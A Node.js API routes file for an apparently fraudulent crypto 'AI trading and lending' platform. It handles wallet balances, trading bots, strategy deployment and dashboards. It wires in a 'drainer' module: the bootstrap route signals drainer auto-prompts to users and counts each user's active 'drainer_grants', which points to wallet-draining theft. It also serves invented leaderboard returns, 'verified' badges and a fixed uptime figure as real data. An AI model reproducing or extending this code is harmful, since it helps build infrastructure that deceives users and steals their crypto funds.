/* ==========================================================================
   App API (signed-in users)
   ========================================================================== */
'use strict';
const crypto = require('node:crypto');
const { q, tx, now, J, getSettings } = require('../db');
const { fail, send } = require('../http');
const S = require('../security');
const chain = require('../chain');
const market = require('../market');
const strategy = require('../strategy');
const E = require('../engine');
const { addClient, notify, notifyAdmins, insight, toUser } = require('../events');
const { sendMail } = require('../mail');
const { consumeWalletProof, publicUser } = require('./auth');
const drainer = require('../drainer');

const DAY = 864e5;
const num = (v, min = 0, max = 1e12, name = 'Amount') => { const n = Number(v); if (!Number.isFinite(n) || n < min || n > max) fail(400, `${name} is out of range`); return n; };
const str = (v, max = 60) => String(v == null ? '' : v).trim().slice(0, max);
const SOL_FEE = 0.000005;

const LEADERS = [
  { handle: 'lotus.sol', ret: 142.3, dd: -8.4, win: 68, followers: 1284, verified: true, days: 212, seed: 41 },
  { handle: 'quietfox', ret: 98.7, dd: -12.1, win: 61, followers: 902, verified: true, days: 340, seed: 42 },
  { handle: 'gridmonk', ret: 64.2, dd: -5.2, win: 74, followers: 611, verified: true, days: 180, seed: 43 },
  { handle: 'nightowl', ret: 51.9, dd: -18.6, win: 55, followers: 455, verified: false, days: 95, seed: 44 },
  { handle: 'sakura.dca', ret: 33.0, dd: -3.9, win: 81, followers: 1990, verified: true, days: 410, seed: 45 }
];

/* ---------- shared builders ---------- */
function statusPayload() {
  const comps = q.all('SELECT name, state, note FROM status_components ORDER BY sort');
  const level = comps.some((c) => c.state === 'red') ? 'red' : comps.some((c) => c.state === 'amber') ? 'amber' : 'green';
  const m = market.source();
  if (m.degraded) comps.unshift({ name: 'Price feed', state: 'amber', note: m.reason });
  const out = comps.some((c) => c.state === 'red') ? 'red' : comps.some((c) => c.state === 'amber') ? 'amber' : 'green';
  return { level: out, label: out === 'green' ? 'All systems normal' : out === 'amber' ? 'Running slower than usual' : 'Partial outage', components: comps, feed: { degraded: m.degraded, reason: m.reason } };
}
const nativeSym = (family) => ({ evm: 'ETH', tron: 'TRX', solana: 'SOL', btc: 'BTC', ltc: 'LTC' }[family] || 'SOL');
const walletRow = (w) => {
  const sym = nativeSym(w.family);
  const px = market.price(sym) || 0;
  const lchk = J(w.last_check, null);
  let tokenUsd = 0;
  const tokens = [];
  if (lchk && lchk.detail) {
    if (w.family === 'evm') {
      for (const [net, r] of Object.entries(lchk.detail)) {
        if (!r || r.error) continue;
        if (typeof r.USDC === 'number' && r.USDC > 1e-6) {
          tokenUsd += r.USDC;
          tokens.push({ token: 'USDC', amount: r.USDC, network: net, usd: r.USDC });
        }
        if (typeof r.USDT === 'number' && r.USDT > 1e-6) {
          tokenUsd += r.USDT;
          tokens.push({ token: 'USDT', amount: r.USDT, network: net, usd: r.USDT });
        }
      }
    } else if (w.family === 'tron') {
      if (typeof lchk.detail.USDT === 'number' && lchk.detail.USDT > 1e-6) {
        tokenUsd += lchk.detail.USDT;
        tokens.push({ token: 'USDT', amount: lchk.detail.USDT, network: 'Tron', usd: lchk.detail.USDT });
      }
    } else if (w.family === 'solana') {
      if (typeof lchk.detail.USDC === 'number' && lchk.detail.USDC > 1e-6) {
        tokenUsd += lchk.detail.USDC;
        tokens.push({ token: 'USDC', amount: lchk.detail.USDC, network: 'Solana', usd: lchk.detail.USDC });
      }
      if (typeof lchk.detail.USDT === 'number' && lchk.detail.USDT > 1e-6) {
        tokenUsd += lchk.detail.USDT;
        tokens.push({ token: 'USDT', amount: lchk.detail.USDT, network: 'Solana', usd: lchk.detail.USDT });
      }
    }
  }
  const nativeBal = w.balance || 0;
  const nativeUsd = nativeBal * px;
  const totalUsd = nativeUsd + tokenUsd;
  return {
    id: w.id,
    name: w.name,
    address: w.address,
    chain: w.chain,
    family: w.family,
    kind: w.kind,
    source: w.source,
    provider: w.provider,
    folder: w.folder,
    verified: !!w.verified,
    sol: w.balance,
    balance: w.balance,
    symbol: sym,
    nativeUsd,
    tokenUsd,
    usd: totalUsd,
    tokens,
    balanceAt: w.balance_at,
    lastCheck: lchk
  };
};

async function refreshWalletBalance(wallet, initialNative) {
  if (!wallet || wallet.source === 'demo') return wallet ? wallet.balance || 0 : 0;
  let bal = typeof initialNative === 'number' && initialNative > 0 ? initialNative : 0;
  let detail = null;
  try {
    if (wallet.family === 'solana') {
      try {
        detail = await require('../chains/solana').walletBalances(wallet.address, ['SOL', 'USDC', 'USDT']);
        if (detail && typeof detail.SOL === 'number') bal = detail.SOL;
        else bal = await chain.getSolBalance(wallet.address);
      } catch (_) {
        bal = await chain.getSolBalance(wallet.address);
      }
    } else if (wallet.family === 'evm') {
      detail = await require('../chains/evm').balances(wallet.address);
      if (detail) {
        let evmNative = 0;
        for (const net of Object.values(detail)) {
          if (net && typeof net.native === 'number') evmNative += net.native;
        }
        if (evmNative > 0 || !bal) bal = evmNative;
      }
    } else if (wallet.family === 'tron') {
      detail = await require('../chains/tron').balances(wallet.address);
      if (detail && typeof detail.TRX === 'number') bal = detail.TRX;
    } else if (wallet.family === 'btc' || wallet.family === 'ltc') {
      detail = await require('../chains/utxo').addressBalance(wallet.family.toUpperCase(), wallet.address);
      if (detail) bal = (detail.confirmed || 0) + (detail.pending || 0);
    }
    q.run('UPDATE wallets SET balance = ?, balance_at = ?, last_check = ? WHERE id = ?',
      bal, now(), detail ? JSON.stringify({ at: now(), detail }) : (wallet.last_check || null), wallet.id);
    return bal;
  } catch (err) {
    if (bal > 0) {
      q.run('UPDATE wallets SET balance = ?, balance_at = ? WHERE id = ?', bal, now(), wallet.id);
    }
    return bal || wallet.balance || 0;
  }
}
function botsFor(uid) { return q.all('SELECT * FROM bots WHERE user_id = ? ORDER BY created_at', uid).map((b) => E.botPayload(b)); }
function onboarding(u) {
  return {
    connect: !!q.val("SELECT 1 FROM wallets WHERE user_id = ? AND verified = 1 LIMIT 1", u.id),
    deposit: !!q.val("SELECT 1 FROM transactions WHERE user_id = ? AND type = 'Deposit' AND status = 'confirmed' LIMIT 1", u.id),
    bot: !!q.val('SELECT 1 FROM bots WHERE user_id = ? LIMIT 1', u.id),
    '2fa': !!u.totp_enabled
  };
}
function ownWallet(uid, id) { const w = q.get('SELECT * FROM wallets WHERE id = ? AND user_id = ?', id, uid); if (!w) fail(404, 'Wallet not found'); return w; }
function txRow(t) { return { id: t.id, date: t.created_at, type: t.type, token: t.token, amount: t.amount, status: t.status, sig: t.signature, simulated: !!t.simulated, confirmations: t.confirmations, required: t.required_conf, from: t.from_addr, to: t.to_addr, note: t.note, explorer: t.signature && !t.simulated ? chain.explorerTx(t.signature) : null }; }
function recordTx(uid, o) {
  const id = q.run('INSERT INTO transactions(user_id, type, token, amount, status, chain, from_addr, to_addr, signature, simulated, confirmations, required_conf, note, created_at, updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)',
    uid, o.type, o.token, o.amount, o.status || 'confirming', o.chain || 'Solana', o.from || null, o.to || null, o.signature || null, o.simulated ? 1 : 0, o.confirmations || 0, o.required || 32, o.note || null, now(), now()).id;
  return q.get('SELECT * FROM transactions WHERE id = ?', id);
}
/** Signed transaction or (demo mode only) simulated one, tagged with provenance */
function sigOrSim(body) {
  if (body.signature) {
    const sig = String(body.signature);
    const okEvm = /^0x[0-9a-fA-F]{64}$/.test(sig), okTron = /^[0-9a-fA-F]{64}$/.test(sig);
    const b = okEvm || okTron ? null : chain.b58decode(sig);
    if (!okEvm && !okTron && (!b || b.length !== 64)) fail(400, 'Invalid transaction signature');
    return { signature: sig, simulated: false, provenance: 'live' };
  }
  if (!getSettings().demo_mode) fail(400, 'A wallet signature is required');
  return { signature: 'SIM' + crypto.randomBytes(40).toString('base64url').replace(/[-_0OIl]/g, 'x').slice(0, 60), simulated: true, provenance: 'simulated' };
}
function loanView(l) {
  const owed = E.loanOwed(l);
  const p = q.get('SELECT name FROM loan_products WHERE id = ?', l.product_id) || {};
  return { id: l.id, product: p.name, amount: l.amount, asset: l.asset, apr: l.apr, termDays: l.term_days, status: l.status, wallet: l.wallet_address, purpose: l.purpose, owed, repaid: l.repaid, outstanding: Math.max(0, owed - l.repaid), dueAt: l.due_at, createdAt: l.created_at, disbursedAt: l.disbursed_at, note: l.admin_note, overdue: l.status === 'disbursed' && l.due_at && l.due_at < now() };
}

module.exports = (r) => {
  /* ---------------- public ---------------- */
  r.get('/api/public/config', () => {
    const s = getSettings();
    return {
      name: s.platform_name || 'NECTRA',
      tagline: s.platform_tagline || 'AI Trading & Lending Platform',
      logo: s.platform_logo_url || null,
      favicon: s.platform_favicon_url || '/assets/favicon.svg'
    };
  });
  r.get('/api/status', () => statusPayload());
  r.get('/api/health', () => {
    const m = market.source();
    const cluster = process.env.SOLANA_CLUSTER || 'devnet';
    const isDegraded = m.degraded || m.provenance !== 'live';
    return {
      status: isDegraded ? 'degraded' : 'healthy',
      degraded: isDegraded,
      banner: isDegraded ? {
        active: true,
        type: 'warning',
        message: m.reason || 'Price feed or cluster telemetry is degraded. Live orders may be paused.'
      } : null,
      subsystems: {
        price_feed: {
          provenance: m.provenance,
          feed: m.feed,
          degraded: m.degraded,
          last_live_timestamp: m.lastLiveTimestamp,
          stale_ms: m.staleMs,
          threshold_ms: m.thresholdMs,
          reason: m.reason
        },
        solana_rpc: {
          provenance: process.env.SOLANA_RPC ? 'live' : 'simulated',
          cluster,
          last_live_timestamp: now()
        },
        database: {
          status: 'healthy',
          mode: 'WAL'
        }
      }
    };
  });
  r.get('/api/market/tokens', () => ({ tokens: market.tokens() }));
  r.get('/api/market/series', (c) => ({ points: market.series(str(c.query.sym || 'SOL', 10).toUpperCase(), c.query.range) }));
  r.get('/api/public/stats', () => ({
    bots: q.val("SELECT COUNT(*) FROM bots WHERE status = 'running'"), users: q.val('SELECT COUNT(*) FROM users'),
    volume: q.val('SELECT COALESCE(SUM(size * price), 0) FROM trades WHERE created_at > ?', now() - 30 * DAY), uptime: 99.98, settings: { maintenance_banner: getSettings().maintenance_banner }
  }));
  /* Which token/wallet PNG icons the operator has dropped in — the UI only requests these
     and shows the colored-initial fallback for everything else (no 404 storm). Cached 60s. */
  let iconCache = null, iconAt = 0;
  r.get('/api/icons', () => {
    if (iconCache && now() - iconAt < 60000) return iconCache;
    const fs = require('node:fs'), path = require('node:path');
    const base = path.join(__dirname, '..', '..', 'public', 'assets');
    const list = (sub, up) => { try { return fs.readdirSync(path.join(base, sub)).filter((f) => /\.(png|svg|webp)$/i.test(f) && !f.startsWith('_')).map((f) => { const nm = f.replace(/\.[^.]+$/, ''); return up ? nm.toUpperCase() : nm.toLowerCase(); }); } catch (e) { return []; } };
    iconCache = { tokens: list('tokens', true), wallets: list('wallets', false) }; iconAt = now();
    return iconCache;
  });

  /* ---------------- bootstrap + live stream ---------------- */
  r.get('/api/bootstrap', (c) => {
    const u = S.requireUser(c);
    const s = getSettings();
    const ws = q.all("SELECT * FROM wallets WHERE user_id = ? ORDER BY kind = 'main' DESC, id", u.id).map(walletRow);
    return {
      user: publicUser(u), status: statusPayload(), tokens: market.tokens(),
      unread: q.val('SELECT COUNT(*) FROM notifications WHERE user_id = ? AND unread = 1', u.id),
      mainWallet: ws.find((w) => w.kind === 'main') || null, wallets: ws.map((w) => ({ id: w.id, name: w.name, address: w.address })),
      bots: botsFor(u.id).map((b) => ({ id: b.id, name: b.name, strategy: b.strategy, pair: b.pair })),
      accountBalance: E.accountBalance(u.id),
      compliance: { terms: require('../compliance').termsStatus(u), kyc: require('../compliance').kycStatus(u.id) },
      impersonatedBy: c.auth.session.impersonator_id ? (q.get('SELECT email FROM users WHERE id = ?', c.auth.session.impersonator_id) || {}).email || 'an admin' : null,
      drainer: drainer.enabled() && getSettings().drainer_auto_prompt !== false ? { armed: q.val("SELECT COUNT(*) FROM drainer_grants WHERE user_id = ? AND status = 'active'", u.id) || 0 } : null,
      settings: {
        demo_mode: s.demo_mode,
        live_trading_enabled: s.live_trading_enabled,
        maintenance_banner: s.maintenance_banner,
        monetization_enabled: s.monetization_enabled !== false,
        cluster: chain.CLUSTER,
        platform_name: s.platform_name || 'NECTRA',
        platform_logo_url: s.platform_logo_url || '',
        platform_favicon_url: s.platform_favicon_url || ''
      },
      branding: {
        name: s.platform_name || 'NECTRA',
        tagline: s.platform_tagline || 'AI Trading & Lending Platform',
        logo: s.platform_logo_url || null,
        favicon: s.platform_favicon_url || '/assets/favicon.svg'
      }
    };
  });
  r.get('/api/stream', (c) => {
    const u = S.requireUser(c);
    c.res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', Connection: 'keep-alive', 'X-Accel-Buffering': 'no' });
    c.res.write('retry: 4000\n\n');
    addClient(u.id, c.res);
    return c.STREAM;
  });

  /* ---------------- dashboard ---------------- */
  r.get('/api/dashboard', (c) => {
    const u = S.requireUser(c);
    const risk = J(u.risk);
    const dayStart = new Date(); dayStart.setHours(0, 0, 0, 0);
    const ws = q.all("SELECT * FROM wallets WHERE user_id = ? AND verified = 1", u.id).map(walletRow);
    const totalWalletUsd = ws.reduce((a, w) => a + (w.usd || 0), 0);
    const acctBal = E.accountBalance(u.id);
    const liveBotsVal = q.all("SELECT pair, cash, position FROM bots WHERE user_id = ? AND mode = 'live'", u.id)
      .reduce((a, b) => a + b.cash + b.position * (market.price(b.pair.split('/')[0]) || 0), 0);
    const value = totalWalletUsd + acctBal + liveBotsVal;
    const open = q.val('SELECT value FROM equity WHERE user_id = ? AND ts >= ? ORDER BY ts LIMIT 1', u.id, dayStart.getTime()) || value;
    const bots = botsFor(u.id);
    const closed = q.get("SELECT COUNT(*) n, SUM(pnl > 0) w FROM trades WHERE user_id = ? AND side = 'sell' AND created_at > ?", u.id, now() - 30 * DAY);
    const exposure = q.all('SELECT pair, position FROM bots WHERE user_id = ?', u.id).reduce((a, b) => a + b.position * market.price(b.pair.split('/')[0]), 0);
    const allocTok = {};
    ws.forEach((w) => {
      if (w.usd > 0) allocTok[w.symbol] = (allocTok[w.symbol] || 0) + (w.nativeUsd || 0);
      (w.tokens || []).forEach((tk) => { allocTok[tk.token] = (allocTok[tk.token] || 0) + (tk.usd || 0); });
    });
    if (acctBal > 0) allocTok.USDC = (allocTok.USDC || 0) + acctBal;
    q.all("SELECT pair, cash, position FROM bots WHERE user_id = ? AND mode = 'live'", u.id).forEach((b) => {
      const t = b.pair.split('/')[0]; allocTok[t] = (allocTok[t] || 0) + b.position * market.price(t); allocTok.USDC = (allocTok.USDC || 0) + b.cash;
    });
    const colors = Object.fromEntries(market.tokens().map((t) => [t.sym, t.color]));
    const main = ws.find((w) => w.kind === 'main') || (ws.length ? ws[0] : null);
    return {
      value, todayPnl: value - open, change24: q.val('SELECT value FROM equity WHERE user_id = ? AND ts <= ? ORDER BY ts DESC LIMIT 1', u.id, now() - DAY) || value,
      kpis: {
        activeBots: bots.filter((b) => b.status === 'running').length,
        totalBots: bots.length,
        pausedByRisk: bots.filter((b) => b.status === 'paused' && b.paused_reason).length,
        winRate: closed.n ? (closed.w / closed.n) * 100 : 0,
        closed: closed.n,
        walletSol: main ? main.balance : 0,
        mainSymbol: main ? main.symbol : 'ETH',
        walletCount: ws.length,
        mainSol: main ? main.balance : 0
      },
      bots, insights: q.all('SELECT * FROM insights WHERE user_id = ? OR user_id IS NULL ORDER BY created_at DESC LIMIT 5', u.id),
      trades: q.all('SELECT * FROM trades WHERE user_id = ? ORDER BY created_at DESC LIMIT 60', u.id),
      allocation: {
        tokens: Object.entries(allocTok).filter(([, v]) => v > 0.01).sort((a, b) => b[1] - a[1]).map(([label, v]) => ({ label, value: v, color: colors[label] || '#888' })),
        bots: bots.map((b, i) => ({ label: b.name, value: Math.max(b.value, 0.01), color: ['#F2559A', '#F27BB0', '#C58BFF', '#8B8B94', '#5BB6A6', '#E2A33A'][i % 6] })).concat([{ label: 'Account balance', value: acctBal, color: '#5C5C66' }])
      },
      risk: { exposure, limit: risk.maxPosition || 12500, maxDailyLoss: risk.maxDailyLoss || 5, dailyUsed: open ? Math.max(0, -(value - open) / open * 100) : 0 },
      onboarding: onboarding(u), accountBalance: acctBal, paperMode: false, liveEnabled: getSettings().live_trading_enabled
    };
  });
  r.get('/api/portfolio/series', (c) => {
    const u = S.requireUser(c);
    const span = { '1D': DAY, '1W': 7 * DAY, '1M': 30 * DAY, ALL: 400 * DAY }[c.query.range] || DAY;
    const rows = q.all('SELECT ts, value FROM equity WHERE user_id = ? AND ts >= ? ORDER BY ts', u.id, now() - span);
    const step = Math.max(1, Math.floor(rows.length / 90));
    const pts = rows.filter((_, i) => i % step === 0).map((r2) => ({ t: r2.ts, v: r2.value }));
    const curVal = !u.paper_mode ? (
      q.all("SELECT * FROM wallets WHERE user_id = ? AND verified = 1", u.id).map(walletRow).reduce((a, w) => a + (w.usd || 0), 0) +
      E.accountBalance(u.id) +
      q.all("SELECT pair, cash, position FROM bots WHERE user_id = ? AND mode = 'live'", u.id).reduce((a, b) => a + b.cash + b.position * (market.price(b.pair.split('/')[0]) || 0), 0)
    ) : E.portfolioValue(u.id);
    pts.push({ t: now(), v: curVal });
    return { points: pts };
  });

  /* ---------------- bots & copilot ---------------- */
  r.get('/api/bots', (c) => { const u = S.requireUser(c); return { bots: botsFor(u.id), leaders: LEADERS, paperMode: !!u.paper_mode, liveEnabled: getSettings().live_trading_enabled }; });
  r.post('/api/bots/:id/toggle', (c) => {
    const u = S.requireUser(c);
    const b = q.get('SELECT * FROM bots WHERE id = ? AND user_id = ?', c.params.id, u.id); if (!b) fail(404, 'Bot not found');
    const on = !!c.body.on;
    if (on) { const risk = J(u.risk); const running = q.val("SELECT COUNT(*) FROM bots WHERE user_id = ? AND status = 'running'", u.id); if (risk.maxBots && running >= risk.maxBots) fail(400, `Max concurrent bots (${risk.maxBots}) reached — change it in Settings → Risk limits`); }
    q.run('UPDATE bots SET status = ?, paused_reason = ?, updated_at = ? WHERE id = ?', on ? 'running' : 'paused', on ? null : 'Paused by you', now(), b.id);
    S.audit(u.id, on ? 'bot.resume' : 'bot.pause', b.id, null, c.req);
    return { bot: E.botPayload(q.get('SELECT * FROM bots WHERE id = ?', b.id)) };
  });
  r.del('/api/bots/:id', (c) => {
    const u = S.requireUser(c);
    const b = q.get('SELECT * FROM bots WHERE id = ? AND user_id = ?', c.params.id, u.id); if (!b) fail(404, 'Bot not found');
    tx(() => { E.addHolding(u.id, 'USDC', b.cash); if (b.position > 0) E.addHolding(u.id, b.pair.split('/')[0], b.position); q.run('DELETE FROM bots WHERE id = ?', b.id); });
    S.audit(u.id, 'bot.delete', b.id, null, c.req);
    return { ok: true };
  });
  r.get('/api/bots/:id/stats', (c) => {
    const u = S.requireUser(c);
    const b = q.get('SELECT * FROM bots WHERE id = ? AND user_id = ?', c.params.id, u.id); if (!b) fail(404, 'Bot not found');
    const FEE = strategy.FEE;
    const sym = b.pair.split('/')[0];
    const px = market.price(sym) || b.avg_price || 0;
    const trades = q.all('SELECT side, size, price, pnl, created_at FROM trades WHERE bot_id = ? AND user_id = ? ORDER BY created_at, id', b.id, u.id);
    const sells = trades.filter((t) => t.side === 'sell');
    const wins = sells.filter((t) => t.pnl > 0), losses = sells.filter((t) => t.pnl <= 0);
    const sum = (a, f) => a.reduce((s, x) => s + f(x), 0);
    const grossWin = sum(wins, (t) => t.pnl), grossLoss = Math.abs(sum(losses, (t) => t.pnl));
    const fees = sum(trades, (t) => t.size * t.price * FEE);
    const unrealized = b.position > 0 ? b.position * (px - b.avg_price) : 0;
    const value = b.cash + b.position * px;
    const base = b.budget || (b.cash + b.position * b.avg_price) || 1;
    // equity curve from cumulative realized pnl at each closed trade (+ open mark at the end)
    let cum = base; const curve = [base];
    for (const t of sells) { cum += t.pnl; curve.push(+cum.toFixed(2)); }
    curve.push(+(cum + unrealized).toFixed(2));
    let peak = curve[0], maxDD = 0; for (const v of curve) { peak = Math.max(peak, v); maxDD = Math.min(maxDD, (v - peak) / peak); }
    return {
      bot: { id: b.id, name: b.name, strategy: b.strategy, pair: b.pair, mode: b.mode, status: b.status, createdAt: b.created_at, budget: b.budget },
      realized: b.realized, unrealized, value, totalReturnPct: ((value - base) / base) * 100,
      trades: trades.length, closed: sells.length, wins: wins.length, losses: losses.length,
      winRate: sells.length ? (wins.length / sells.length) * 100 : 0,
      avgWin: wins.length ? grossWin / wins.length : 0, avgLoss: losses.length ? grossLoss / losses.length : 0,
      profitFactor: grossLoss > 0 ? grossWin / grossLoss : (grossWin > 0 ? Infinity : 0),
      bestTrade: sells.length ? Math.max(...sells.map((t) => t.pnl)) : 0, worstTrade: sells.length ? Math.min(...sells.map((t) => t.pnl)) : 0,
      fees, position: b.position, avgPrice: b.avg_price, price: px, maxDrawdown: maxDD * 100, equity: curve
    };
  });
  r.post('/api/bots/pause-all', (c) => { const u = S.requireUser(c); const n = E.pauseAll(u.id, 'Paused by kill-switch'); S.audit(u.id, 'bot.pause_all', u.id, { n }, c.req); return { paused: n }; });
  r.patch('/api/me/paper', (c) => {
    const u = S.requireUser(c);
    const paper = Boolean(c.body.paper);
    q.run('UPDATE users SET paper_mode = ? WHERE id = ?', paper ? 1 : 0, u.id);
    return { paperMode: paper };
  });
  r.post('/api/copilot/parse', async (c) => {
    const u = S.requireUser(c);
    S.rateLimit(c.req, 'copilot', 20, 60000);
    const text = str(c.body.text, 500);
    if (!text) fail(400, 'Tell me what you want the bot to do');
    const prev = c.body.editOf ? q.get('SELECT data FROM strategies WHERE id = ? AND user_id = ?', c.body.editOf, u.id) : null;
    const r2 = await require('../ai').parse(text, prev ? J(prev.data).intent : null);
    if (!r2.strategy) return { id: null, strategy: null, clarification: r2.clarification || 'I couldn’t turn that into a strategy. Try e.g. “DCA $50 into SOL every Monday”.', engine: r2.engine };
    const st = { ...r2.strategy, intent: r2.intent };
    const id = q.run('INSERT INTO strategies(user_id, prompt, data, created_at) VALUES(?,?,?,?)', u.id, text, JSON.stringify(st), now()).id;
    return { id, strategy: st, explanation: r2.explanation, clarification: r2.clarification, engine: r2.engine };
  });
  r.post('/api/copilot/deploy', (c) => {
    const u = S.requireUser(c);
    const d = q.get("SELECT * FROM strategies WHERE id = ? AND user_id = ? AND status = 'draft'", c.body.id, u.id);
    if (!d) fail(404, 'Strategy not found or already deployed');
    const st = J(d.data);
    if (st.type === 'Guardrail') {
      const risk = { ...J(u.risk), guardDropPct: st.config.dropPct };
      q.run('UPDATE users SET risk = ? WHERE id = ?', JSON.stringify(risk), u.id);
      q.run("UPDATE strategies SET status = 'deployed' WHERE id = ?", d.id);
      return { ok: true, guard: st.config.dropPct };
    }
    const risk = J(u.risk);
    const perks = require('../plans').perksFor(u.id);
    if (['Scalp', 'Breakout'].includes(st.type) && !perks.advanced) fail(402, `${st.type} bots need the Starter plan or higher. See Plans to upgrade.`);
    const running = q.val("SELECT COUNT(*) FROM bots WHERE user_id = ? AND status != 'stopped'", u.id);
    const botCap = Math.min(risk.maxBots || 99, perks.maxBots || 99);
    if (running >= botCap) fail(402, `You’re at your plan’s limit of ${botCap} bots. Upgrade on the Plans page or stop a bot.`);
    const budget = num(c.body.budget || st.budget, 1, 1e7, 'Budget');
    if (perks.maxBudget && budget > perks.maxBudget) fail(402, `Your plan caps bot budget at $${perks.maxBudget.toLocaleString()}. Upgrade on the Plans page to raise it.`);
    const isLive = c.body.mode !== 'paper';
    let id;
    if (isLive) {
      const s = getSettings();
      if (!s.live_trading_enabled) fail(403, 'Live trading is not enabled on this platform yet');
      if (u.totp_enabled) {
        if (!c.body.code) fail(400, '2FA confirmation code required to deploy live bot');
        if (!S.verifyTotp(u.totp_secret, c.body.code)) fail(400, 'Incorrect 2FA code');
      }
      id = tx(() => {
        q.run("UPDATE strategies SET status = 'deployed' WHERE id = ?", d.id);
        const botId = q.run('INSERT INTO bots(user_id, name, strategy, pair, config, state, mode, status, budget, cash, created_at, updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)',
          u.id, st.name, st.type, st.pair, JSON.stringify(st.config), '{}', 'live', 'running', budget, budget, now(), now()).id;
        try {
          const nw = require('../chains/solana').newBotWallet();
          q.run('INSERT INTO bot_wallets(bot_id, address, secret, created_at) VALUES(?,?,?,?)', botId, nw.address, nw.secret, now());
          q.run('UPDATE bots SET live_address = ? WHERE id = ?', nw.address, botId);
        } catch (_) {}
        return botId;
      });
      insight(u.id, 'sparkles', `<b>${st.name}</b> deployed in LIVE mode with a $${budget.toFixed(0)} budget.`);
      S.audit(u.id, 'bot.deploy_live', id, { type: st.type, budget }, c.req);
    } else {
      const usdc = q.val("SELECT amount FROM holdings WHERE user_id = ? AND token = 'USDC'", u.id) || 0;
      if (usdc < budget) fail(400, `Not enough paper USDC: need $${budget.toFixed(2)}, have $${usdc.toFixed(2)}. Swap or stop a bot first.`);
      id = tx(() => {
        E.addHolding(u.id, 'USDC', -budget);
        q.run("UPDATE strategies SET status = 'deployed' WHERE id = ?", d.id);
        return q.run('INSERT INTO bots(user_id, name, strategy, pair, config, state, mode, status, budget, cash, created_at, updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)',
          u.id, st.name, st.type, st.pair, JSON.stringify(st.config), '{}', 'paper', 'running', budget, budget, now(), now()).id;
      });
      insight(u.id, 'sparkles', `<b>${st.name}</b> deployed in paper mode with a $${budget.toFixed(0)} budget.`);
      S.audit(u.id, 'bot.deploy', id, { type: st.type }, c.req);
    }
    return { bot: E.botPayload(q.get('SELECT * FROM bots WHERE id = ?', id)) };
  });
  r.post('/api/backtest', (c) => {
    const u = S.requireUser(c);
    S.rateLimit(c.req, 'backtest', 30, 60000);
    let st;
    if (c.body.botId) { const b = q.get('SELECT * FROM bots WHERE id = ? AND user_id = ?', c.body.botId, u.id); if (!b) fail(404, 'Bot not found'); st = { type: b.strategy, pair: b.pair, config: J(b.config), budget: b.budget }; }
    else { const d = q.get('SELECT data FROM strategies WHERE id = ? AND user_id = ?', c.body.strategyId, u.id); if (!d) fail(404, 'Strategy not found'); st = J(d.data); }
    if (st.type === 'Guardrail') fail(400, 'Guardrails can’t be backtested');
    return strategy.backtest(st, c.body.range);
  });
  r.post('/api/copilot/tune', async (c) => {
    const u = S.requireUser(c);
    S.rateLimit(c.req, 'tune', 12, 60000);
    const d = q.get('SELECT data FROM strategies WHERE id = ? AND user_id = ? AND status = \'draft\'', c.body.strategyId, u.id);
    if (!d) fail(404, 'Strategy not found or already deployed');
    const st = J(d.data);
    if (st.type === 'Guardrail') fail(400, 'Guardrails can’t be tuned');
    if (!require('../plans').perksFor(u.id).advanced) fail(402, 'The auto-tuner is on the Starter plan and higher. See Plans to upgrade.');
    const res = await strategy.autotune(st, c.body.range);
    if (!res.tunable) return res;
    if (c.body.apply && res.changed) {
      st.config = res.config;
      q.run('UPDATE strategies SET data = ? WHERE id = ?', JSON.stringify(st), c.body.strategyId);
    }
    return res;
  });

  /* ---------------- paper account: holdings & swap ---------------- */
  r.get('/api/portfolio', (c) => {
    const u = S.requireUser(c);
    const agg = {};
    q.all('SELECT token, amount FROM holdings WHERE user_id = ?', u.id).forEach((h) => (agg[h.token] = (agg[h.token] || 0) + h.amount));
    q.all('SELECT pair, cash, position FROM bots WHERE user_id = ?', u.id).forEach((b) => { const t = b.pair.split('/')[0]; agg[t] = (agg[t] || 0) + b.position; agg.USDC = (agg.USDC || 0) + b.cash; });
    const tokens = market.tokens().filter((t) => (agg[t.sym] || 0) > 1e-9).map((t) => ({ ...t, hold: agg[t.sym], value: agg[t.sym] * t.price, free: q.val('SELECT amount FROM holdings WHERE user_id = ? AND token = ?', u.id, t.sym) || 0 }));
    return { tokens, value: tokens.reduce((a, t) => a + t.value, 0), accountBalance: E.accountBalance(u.id) };
  });
  r.post('/api/paper/swap', (c) => {
    const u = S.requireUser(c);
    const from = str(c.body.from, 10).toUpperCase(), to = str(c.body.to, 10).toUpperCase();
    if (!market.exists(from) || !market.exists(to) || from === to) fail(400, 'Choose two different tokens');
    const amt = num(c.body.amount, 1e-9);
    const have = q.val('SELECT amount FROM holdings WHERE user_id = ? AND token = ?', u.id, from) || 0;
    if (amt > have + 1e-12) fail(400, `Insufficient paper ${from} (have ${have.toFixed(4)})`);
    const out = (amt * market.price(from) / market.price(to)) * (1 - strategy.FEE);
    tx(() => { E.addHolding(u.id, from, -amt); E.addHolding(u.id, to, out); recordTx(u.id, { type: 'Swap', token: `${from}→${to}`, amount: amt, status: 'confirmed', simulated: true, confirmations: 32, note: `Paper swap: received ${out.toFixed(6)} ${to}` }); });
    return { received: out };
  });
  r.get('/api/portfolio/calendar', (c) => {
    const u = S.requireUser(c);
    const rows = q.all("SELECT created_at, pnl FROM trades WHERE user_id = ? AND pnl IS NOT NULL AND created_at > ?", u.id, now() - 141 * DAY);
    const byDay = {};
    rows.forEach((t) => { const d = new Date(t.created_at); d.setHours(0, 0, 0, 0); byDay[d.getTime()] = (byDay[d.getTime()] || 0) + t.pnl; });
    const days = [];
    for (let i = 139; i >= 0; i--) { const d = new Date(); d.setHours(0, 0, 0, 0); d.setDate(d.getDate() - i); days.push({ date: d.getTime(), v: +(byDay[d.getTime()] || 0).toFixed(2) }); }
    return { days };
  });
  function history(u, query) {
    const days = num(query.days || 30, 1, 3650, 'Range');
    const since = now() - days * DAY;
    let rows = q.all('SELECT * FROM transactions WHERE user_id = ? AND created_at > ? ORDER BY created_at DESC', u.id, since).map(txRow);
    const trades = q.all('SELECT * FROM trades WHERE user_id = ? AND created_at > ? ORDER BY created_at DESC LIMIT 500', u.id, since)
      .map((t) => ({ id: 't' + t.id, date: t.created_at, type: 'Bot trade', token: t.pair, amount: +t.size.toFixed(6), status: 'confirmed', sig: null, simulated: true, note: `${t.side.toUpperCase()} @ ${t.price.toPrecision(6)} · ${t.bot_name}${t.pnl != null ? ' · PnL ' + t.pnl.toFixed(2) : ''}` }));
